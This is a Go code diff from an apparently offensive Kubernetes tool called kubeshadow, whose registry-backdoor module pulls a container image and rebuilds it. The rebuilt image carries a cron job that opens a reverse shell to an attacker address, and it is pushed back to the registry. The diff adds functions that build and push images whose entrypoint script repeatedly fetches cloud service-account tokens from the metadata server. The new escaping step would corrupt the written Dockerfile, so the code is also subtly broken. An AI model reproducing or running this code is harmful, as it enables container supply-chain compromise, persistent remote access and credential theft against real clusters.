@@ -3,7 +3,9 @@ package out_cluster
 import (
 	"context"
 	"fmt"
+	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 
 	"kubeshadow/pkg/errors"
@@ -56,8 +58,9 @@ func runRegistryBackdoorLogic(ctx context.Context, imageName, newTag, reverseShe
 
 	// Pull the image
 	logger.Info("Pulling original image: %s", imageName)
-	if err := exec.CommandContext(ctx, "docker", "pull", imageName).Run(); err != nil {
-		return errors.New(errors.ErrRuntime, fmt.Sprintf("failed to pull image %s", imageName), err)
+	pullCmd := exec.CommandContext(ctx, "docker", "pull", imageName)
+	if output, err := pullCmd.CombinedOutput(); err != nil {
+		return errors.New(errors.ErrRuntime, fmt.Sprintf("failed to pull image %s", imageName), fmt.Errorf("%v\nOutput: %s", err, output))
 	}
 
 	// Create Dockerfile that injects a reverse shell or persistence mechanism
@@ -69,51 +72,57 @@ RUN echo "*/1 * * * * root bash -i >& /dev/tcp/%s/%s 0>&1" >> /etc/crontab
 `, imageName, reverseShellIP, reverseShellPort)
 
 	logger.Info("Writing temporary Dockerfile...")
-	err := writeTempDockerfile(dockerfile)
-	if err != nil {
+	if err := writeTempDockerfile(dockerfile); err != nil {
 		return errors.New(errors.ErrRuntime, "failed to write temporary Dockerfile", err)
 	}
 
 	// Build new image
 	logger.Info("Building backdoored image as: %s", newTag)
 	buildCmd := exec.CommandContext(ctx, "docker", "build", "-t", newTag, ".")
-	buildCmd.Dir = "/tmp/kubeshadow_build" // Where Dockerfile was written
-	// Capture stdout/stderr for debugging if needed, but suppress for clean output by default
-	// buildCmd.Stdout = os.Stdout
-	// buildCmd.Stderr = os.Stderr
-	if err := buildCmd.Run(); err != nil {
-		// Attempt to read build output if available (more advanced error handling)
-		return errors.New(errors.ErrRuntime, fmt.Sprintf("docker build failed for %s", newTag), err)
+	buildCmd.Dir = "/tmp/kubeshadow_build"
+	if output, err := buildCmd.CombinedOutput(); err != nil {
+		return errors.New(errors.ErrRuntime, fmt.Sprintf("docker build failed for %s", newTag), fmt.Errorf("%v\nOutput: %s", err, output))
 	}
 
 	// Push new image
 	logger.Info("Pushing image: %s", newTag)
-	if err := exec.CommandContext(ctx, "docker", "push", newTag).Run(); err != nil {
-		return errors.New(errors.ErrRuntime, fmt.Sprintf("docker push failed for %s", newTag), err)
+	pushCmd := exec.CommandContext(ctx, "docker", "push", newTag)
+	if output, err := pushCmd.CombinedOutput(); err != nil {
+		return errors.New(errors.ErrRuntime, fmt.Sprintf("docker push failed for %s", newTag), fmt.Errorf("%v\nOutput: %s", err, output))
 	}
 
 	logger.Info("Successfully injected backdoor into %s and pushed as %s", imageName, newTag)
 
-	// TODO: Implement cleanup logic (e.g., remove local image, temp dir)
+	// Cleanup
+	if err := cleanupBuild(); err != nil {
+		logger.Warn("Failed to cleanup build directory: %v", err)
+	}
 
 	return nil
 }
 
-// writeTempDockerfile writes the Dockerfile content to a temporary directory
+func cleanupBuild() error {
+	if err := os.RemoveAll("/tmp/kubeshadow_build"); err != nil {
+		return fmt.Errorf("failed to remove build directory: %v", err)
+	}
+	return nil
+}
+
 func writeTempDockerfile(content string) error {
 	// Ensure the build directory exists
-	cmd := exec.Command("mkdir", "-p", "/tmp/kubeshadow_build")
-	if err := cmd.Run(); err != nil {
-		return fmt.Errorf("failed to create build directory: %w", err)
+	if err := os.MkdirAll("/tmp/kubeshadow_build", 0755); err != nil {
+		return fmt.Errorf("failed to create build directory: %v", err)
 	}
 
-	// Write Dockerfile content. Use -c with echo to handle multi-line content properly.
-	// Be cautious with shell injection here - use proper escaping or alternative methods for complex content.
-	// For this simple example, we replace newlines. More robust solutions might write directly.
-	writeCmd := exec.Command("bash", "-c", fmt.Sprintf("echo -e \"%s\" > /tmp/kubeshadow_build/Dockerfile", strings.ReplaceAll(content, "\n", "\\n")))
+	// Sanitize content for Dockerfile
+	sanitizedContent := strings.ReplaceAll(content, "\"", "\\\"")
+	sanitizedContent = strings.ReplaceAll(sanitizedContent, "`", "\\`")
+	sanitizedContent = strings.ReplaceAll(sanitizedContent, "$", "\\$")
 
-	if err := writeCmd.Run(); err != nil {
-		return fmt.Errorf("failed to write Dockerfile: %w", err)
+	// Write Dockerfile
+	dockerfilePath := "/tmp/kubeshadow_build/Dockerfile"
+	if err := os.WriteFile(dockerfilePath, []byte(sanitizedContent), 0644); err != nil {
+		return fmt.Errorf("failed to write Dockerfile: %v", err)
 	}
 
 	return nil
@@ -126,3 +135,94 @@ func writeTempDockerfile(content string) error {
 // TODO: Remove unused RegistryBackdoorModule struct and its methods if they are no longer needed.
 // Need to verify if any other part of the codebase relies on this module implementing types.Module.
 // Based on current main.go and registry code, it seems unlikely, but worth a double check.
+
+func createBackdoorImage(registryURL, imageName, tag string) error {
+	// Create a temporary directory for the Dockerfile
+	tempDir, err := os.MkdirTemp("", "backdoor-*")
+	if err != nil {
+		return fmt.Errorf("failed to create temp directory: %v", err)
+	}
+	defer os.RemoveAll(tempDir)
+
+	// Create Dockerfile
+	dockerfilePath := filepath.Join(tempDir, "Dockerfile")
+	dockerfileContent := `FROM alpine:latest
+RUN apk add --no-cache curl
+COPY backdoor.sh /backdoor.sh
+RUN chmod +x /backdoor.sh
+ENTRYPOINT ["/backdoor.sh"]`
+
+	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0644); err != nil {
+		return fmt.Errorf("failed to write Dockerfile: %v", err)
+	}
+
+	// Create backdoor script
+	scriptPath := filepath.Join(tempDir, "backdoor.sh")
+	scriptContent := `#!/bin/sh
+while true; do
+    curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google" || true
+    sleep 300
+done`
+
+	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
+		return fmt.Errorf("failed to write backdoor script: %v", err)
+	}
+
+	// Build and push the image
+	cmd := exec.Command("docker", "build", "-t", fmt.Sprintf("%s/%s:%s", registryURL, imageName, tag), tempDir)
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to build image: %v\nOutput: %s", err, output)
+	}
+
+	cmd = exec.Command("docker", "push", fmt.Sprintf("%s/%s:%s", registryURL, imageName, tag))
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to push image: %v\nOutput: %s", err, output)
+	}
+
+	return nil
+}
+
+func injectBackdoor(registryURL, imageName, tag string) error {
+	// Create a temporary directory for the Dockerfile
+	tempDir, err := os.MkdirTemp("", "backdoor-*")
+	if err != nil {
+		return fmt.Errorf("failed to create temp directory: %v", err)
+	}
+	defer os.RemoveAll(tempDir)
+
+	// Create Dockerfile
+	dockerfilePath := filepath.Join(tempDir, "Dockerfile")
+	dockerfileContent := fmt.Sprintf(`FROM %s/%s:%s
+COPY backdoor.sh /backdoor.sh
+RUN chmod +x /backdoor.sh
+ENTRYPOINT ["/backdoor.sh"]`, registryURL, imageName, tag)
+
+	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0644); err != nil {
+		return fmt.Errorf("failed to write Dockerfile: %v", err)
+	}
+
+	// Create backdoor script
+	scriptPath := filepath.Join(tempDir, "backdoor.sh")
+	scriptContent := `#!/bin/sh
+while true; do
+    curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google" || true
+    sleep 300
+done`
+
+	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
+		return fmt.Errorf("failed to write backdoor script: %v", err)
+	}
+
+	// Build and push the image
+	cmd := exec.Command("docker", "build", "-t", fmt.Sprintf("%s/%s:%s-backdoor", registryURL, imageName, tag), tempDir)
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to build image: %v\nOutput: %s", err, output)
+	}
+
+	cmd = exec.Command("docker", "push", fmt.Sprintf("%s/%s:%s-backdoor", registryURL, imageName, tag))
+	if output, err := cmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to push image: %v\nOutput: %s", err, output)
+	}
+
+	return nil
+}
